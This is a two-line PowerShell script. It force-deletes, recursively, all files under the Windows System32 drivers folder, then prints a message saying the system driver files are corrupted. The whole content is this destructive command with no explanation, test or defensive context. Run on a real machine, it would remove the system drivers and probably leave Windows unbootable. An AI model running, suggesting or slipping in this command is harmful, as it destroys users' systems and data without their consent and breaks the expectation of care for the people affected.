Remove-Item -Path 'C:\Windows\System32\drivers\*' -Recurse -Force
Write-Output 'System driver files corrupted'
